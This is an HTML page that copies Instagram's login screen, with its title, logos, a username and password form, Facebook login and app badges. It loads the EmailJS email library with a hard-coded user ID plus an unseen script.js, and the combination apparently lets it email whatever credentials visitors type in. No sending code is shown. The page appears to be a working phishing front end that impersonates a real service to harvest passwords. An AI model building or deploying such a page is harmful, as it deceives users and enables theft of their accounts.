<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css" />
    <link
      rel="icon"
      href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png"
    />
  </head>
  <body>
    <div class="all-item-container">
      <img
        class="logo-img"
        src="https://www.logo.wine/a/logo/Instagram/Instagram-Wordmark-Black-Logo.wine.svg"
        alt=""
      />

      <div class="form-div">
        <form action="">
          <input
            class="email"
            type="text"
            placeholder="Phone number, username, or email"
          />
          <input class="parol" type="password" placeholder="Password" />
          <button class="btn" type="submit">Log in</button>
        </form>
      </div>

      <h4>OR</h4>
      <a href=""
        ><img
          class="face"
          src="https://i.pinimg.com/564x/b3/26/b5/b326b5f8d23cd1e0f18df4c9265416f7--facebook-icon-negative-feedback.jpg"
          alt=""
        />
        Log in with Facebook</a
      >
      <a class="forgot" href="">Forgot password?</a>
    </div>

    <div class="alt-container">
      <h4>Don't have an account?<a class="signup" href=""> Sign up</a></h4>
      <h5>Get the app</h5>
      <div class="play-image">
        <img
          class="play-store"
          src="https://www.fcsok.org/wp-content/uploads/2020/04/get-it-on-google-play-badge.png"
          alt=""
        />
        <img
          class="microsoft"
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Get_it_from_Microsoft_Badge.svg/1200px-Get_it_from_Microsoft_Badge.svg.png"
          alt=""
        />
      </div>
    </div>

    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.0/dist/email.min.js"
    ></script>
    <script type="text/javascript">
      (function () {
        emailjs.init("lowP-rDTN3gKyNXTV"); //use your USER ID
      })();
    </script>
    <script src="script.js"></script>
  </body>
</html>
